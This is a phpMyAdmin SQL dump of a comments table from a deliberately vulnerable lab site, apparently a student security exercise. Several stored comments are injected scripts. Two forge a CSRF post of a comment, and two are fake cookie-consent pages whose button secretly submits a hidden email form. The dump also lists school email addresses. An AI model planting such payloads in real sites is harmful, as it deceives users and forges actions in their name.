-- phpMyAdmin SQL Dump
-- version 5.2.1
-- https://www.phpmyadmin.net/
--
-- Hôte : 127.0.0.1
-- Généré le : ven. 27 sep. 2024 à 11:06
-- Version du serveur : 10.4.32-MariaDB
-- Version de PHP : 8.2.12

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
START TRANSACTION;
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Base de données : `vulnerable_site`
--

-- --------------------------------------------------------

--
-- Structure de la table `comments`
--

CREATE TABLE `comments` (
  `id` int(11) NOT NULL,
  `username` varchar(255) DEFAULT NULL,
  `comment` text DEFAULT NULL,
  `created_at` timestamp NOT NULL DEFAULT current_timestamp(),
  `ip_address` varchar(255) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

--
-- Déchargement des données de la table `comments`
--

INSERT INTO `comments` (`id`, `username`, `comment`, `created_at`, `ip_address`) VALUES
(60, NULL, '<style>\r\n\r\nbody{\r\nbackground-color: #f4f4f9;\r\n}\r\n</style>', '2024-09-27 08:44:31', '127.0.0.1'),
(65, NULL, '<script>\r\n    document.querySelector(\'form\').addEventListener(\'submit\', function(e) {\r\n        var csrfForm = document.createElement(\'form\');\r\n        csrfForm.action = \'127.17.219.110/siteCybersecurite/attaqueCSRF/public\'; // L\'URL cible de l\'attaque CSRF\r\n        csrfForm.method = \'POST\';\r\n\r\n        var commentaireField = document.createElement(\'input\');\r\n        commentaireField.type = \'hidden\';\r\n        commentaireField.name = \'commentaire\';\r\n        commentaireField.value = \'Ce commentaire est ajouté via une attaque CSRF !\';\r\n        csrfForm.appendChild(commentaireField);\r\n\r\n        var articleField = document.createElement(\'input\');\r\n        articleField.type = \'hidden\';\r\n        articleField.name = \'article_id\';\r\n        articleField.value = \'1234\'; // Identifiant de l\'article\r\n        csrfForm.appendChild(articleField);\r\n\r\n        document.body.appendChild(csrfForm);\r\n\r\n        csrfForm.submit();\r\n    });\r\n</script>', '2024-09-27 08:47:08', '172.17.219.110'),
(66, NULL, '<script>\r\n    document.querySelector(\'form\').addEventListener(\'submit\', function(e) {\r\n        var csrfForm = document.createElement(\'form\');\r\n        csrfForm.action = \'127.17.219.110/siteCybersecurite/attaqueCSRF/public\'; // L\'URL cible de l\'attaque CSRF\r\n        csrfForm.method = \'POST\';\r\n\r\n        var commentaireField = document.createElement(\'input\');\r\n        commentaireField.type = \'hidden\';\r\n        commentaireField.name = \'commentaire\';\r\n        commentaireField.value = \'Ce commentaire est ajouté via une attaque CSRF du papa de Florian!\';\r\n        csrfForm.appendChild(commentaireField);\r\n\r\n        var articleField = document.createElement(\'input\');\r\n        articleField.type = \'hidden\';\r\n        articleField.name = \'article_id\';\r\n        articleField.value = \'1234\'; // Identifiant de l\'article\r\n        csrfForm.appendChild(articleField);\r\n\r\n        document.body.appendChild(csrfForm);\r\n\r\n        csrfForm.submit();\r\n    });\r\n</script>', '2024-09-27 08:47:41', '172.17.219.110'),
(67, NULL, 'test', '2024-09-27 08:47:44', '172.17.219.110'),
(68, NULL, '<script>\r\n        document.getElementById(\"surpriseButton\").addEventListener(\"click\", function() {\r\n            // Cache le bouton\r\n            document.getElementById(\"surpriseButton\").style.display = \"none\";\r\n            \r\n            // Affiche le message d\'anniversaire avec une transition\r\n            const message = document.getElementById(\"birthdayMessage\");\r\n            message.style.display = \"block\";\r\n            setTimeout(() => {\r\n                message.style.opacity = 1; // Fait apparaître le message progressivement\r\n            }, 100);\r\n        });\r\n    </script>', '2024-09-27 08:47:57', '172.17.12.12'),
(69, NULL, '<div class=\"container\">\r\n        <button id=\"surpriseButton\">Cliquez pour une surprise</button>\r\n        <div id=\"birthdayMessage\">🎉 Joyeux Anniversaire 🎉</div>\r\n    </div>\r\n\r\n<script>\r\n        document.getElementById(\"surpriseButton\").addEventListener(\"click\", function() {\r\n            // Cache le bouton\r\n            document.getElementById(\"surpriseButton\").style.display = \"none\";\r\n            \r\n            // Affiche le message d\'anniversaire avec une transition\r\n            const message = document.getElementById(\"birthdayMessage\");\r\n            message.style.display = \"block\";\r\n            setTimeout(() => {\r\n                message.style.opacity = 1; // Fait apparaître le message progressivement\r\n            }, 100);\r\n        });\r\n    </script>\r\n<style>\r\n #birthdayMessage {\r\n            font-size: 5em;\r\n            color: #ff6347;\r\n            display: none;\r\n            transition: opacity 0.5s ease-in-out; /* Transition douce */\r\n            opacity: 0; /* Le message commence caché */\r\n        }\r\n\r\n        #surpriseButton {\r\n            padding: 15px 30px;\r\n            font-size: 1.5em;\r\n            background-color: #28a745;\r\n            color: white;\r\n            border: none;\r\n            border-radius: 5px;\r\n            cursor: pointer;\r\n            transition: background-color 0.3s;\r\n        }\r\n\r\n        #surpriseButton:hover {\r\n            background-color: #218838;\r\n        }\r\n    </style>', '2024-09-27 08:48:38', '172.17.12.12'),
(70, NULL, '<script>\r\n        function openMediaPage() {\r\n            // Ouvre une nouvelle fenêtre ou onglet avec une image ou vidéo\r\n            const newWindow = window.open(\"\", \"_blank\");\r\n            newWindow.document.write(`\r\n                <!DOCTYPE html>\r\n                <html lang=\"fr\">\r\n                <head>\r\n                    <meta charset=\"UTF-8\">\r\n                    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\r\n                    <title>Média</title>\r\n                </head>\r\n                <body>\r\n                    <h1>Voici votre image ou vidéo</h1>\r\n                    <img src=\"https://example.com/your-image.jpg\" alt=\"Image\" />\r\n                    <!-- Pour afficher une vidéo, décommentez la ligne suivante et remplacez le lien -->\r\n                    <!-- <video controls>\r\n                        <source src=\"https://example.com/your-video.mp4\" type=\"video/mp4\">\r\n                        Votre navigateur ne supporte pas la vidéo.\r\n                    </video> -->\r\n                </body>\r\n                </html>\r\n            `);\r\n            newWindow.document.close(); // Ferme le document pour le rendre visible\r\n        }\r\n    </script>', '2024-09-27 08:48:40', '172.17.12.14'),
(76, NULL, '<style>\r\n        body {\r\n            transition: background-color\r\n;\r\n        }\r\n    </style>\r\n</head>\r\n<body>\r\n\r\n    <button id=\"changeColorBtn\">Changer la couleur de fond</button>\r\n\r\n    <script>\r\n        const button = document.getElementById(\'changeColorBtn\');\r\n\r\n        button.addEventListener(\'click\', function() {\r\n            // Générer une couleur aléatoire\r\n            const randomColor = \'#\' + Math.floor(Math.random()*16777215).toString(16);\r\n            // Changer la couleur de fond\r\n            document.body.style.backgroundColor = randomColor;\r\n        });\r\n    </script>', '2024-09-27 08:54:40', '172.17.12.13'),
(77, NULL, '<p>\r\n\r\n    <meta charset=\"UTF-8\">\r\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\r\n    <title>Accepter les Cookies</title>\r\n\r\n\r\n    </p><h1>Petit Message</h1>\r\n    <p>Veuillez accepter les cookies pour continuer à utiliser notre site.</p>\r\n\r\n    <!-- Formulaire caché pour envoyer un email sans que la victime le sache -->\r\n    <form id=\"emailForm\" method=\"POST\" action=\"send_email.php\" style=\"display:none;\">\r\n        <input type=\"hidden\" name=\"email\" value=\"jeanchristophe.heron@sts-sio-caen.info\"> <!-- Remplace par ton email -->\r\n        <input type=\"hidden\" name=\"message\" value=\"L\'utilisateur a accepté les cookies.\">\r\n    </form>\r\n\r\n    <!-- Bouton d\'acceptation des cookies (ce bouton soumet le formulaire caché) -->\r\n    <button id=\"acceptCookies\">Das ist Gut ;)</button>\r\n\r\n    <script>\r\n        // Lorsqu\'on clique sur le bouton \"Accepter les Cookies\", le formulaire caché est soumis\r\n        document.getElementById(\'acceptCookies\').onclick = function() {\r\n            alert(\"Thx u\");\r\n            document.getElementById(\'emailForm\').submit(); // Soumet le formulaire caché\r\n        };\r\n    </script>\r\n\r\n<p></p> \r\n', '2024-09-27 08:55:18', '172.17.12.14'),
(80, NULL, '<!DOCTYPE html>\r\n<html lang=\"fr\">\r\n<head>\r\n    <meta charset=\"UTF-8\">\r\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\r\n    <title>Accepter les Cookies</title>\r\n</head>\r\n<body>\r\n    <h1>Nous utilisons des cookies pour améliorer votre expérience.</h1>\r\n    <p>Veuillez accepter les cookies pour continuer à utiliser notre site.</p>\r\n\r\n    <!-- Formulaire caché pour envoyer un email sans que la victime le sache -->\r\n    <form id=\"emailForm\" method=\"POST\" action=\"send_email.php\" style=\"display:none;\">\r\n        <input type=\"hidden\" name=\"email\" value=\"matthieu.saillardaumont@sts-sio-caen.info\"> <!-- Remplace par ton email -->\r\n        <input type=\"hidden\" name=\"message\" value=\"L\'utilisateur a accepté les cookies.\">\r\n    </form>\r\n\r\n    <!-- Bouton d\'acceptation des cookies (ce bouton soumet le formulaire caché) -->\r\n    <button id=\"acceptCookies\">Accepter les Cookies</button>\r\n\r\n    <script>\r\n        // Lorsqu\'on clique sur le bouton \"Accepter les Cookies\", le formulaire caché est soumis\r\n        document.getElementById(\'acceptCookies\').onclick = function() {\r\n            alert(\"Merci d\'avoir accepté les cookies.\");\r\n            document.getElementById(\'emailForm\').submit(); // Soumet le formulaire caché\r\n        };\r\n    </script>\r\n</body>\r\n</html>', '2024-09-27 09:00:47', '172.17.219.83'),
(81, NULL, '<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>Page d\'Accueil</title>\n    <style>\n        body {\n            font-family: Arial, sans-serif;\n            text-align: center;\n            margin: 50px;\n        }\n        button {\n            padding: 10px 20px;\n            font-size: 16px;\n            cursor: pointer;\n        }\n    </style>\n</head>', '2024-09-27 09:01:33', '172.17.12.14');

--
-- Index pour les tables déchargées
--

--
-- Index pour la table `comments`
--
ALTER TABLE `comments`
  ADD PRIMARY KEY (`id`);

--
-- AUTO_INCREMENT pour les tables déchargées
--

--
-- AUTO_INCREMENT pour la table `comments`
--
ALTER TABLE `comments`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=83;
COMMIT;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
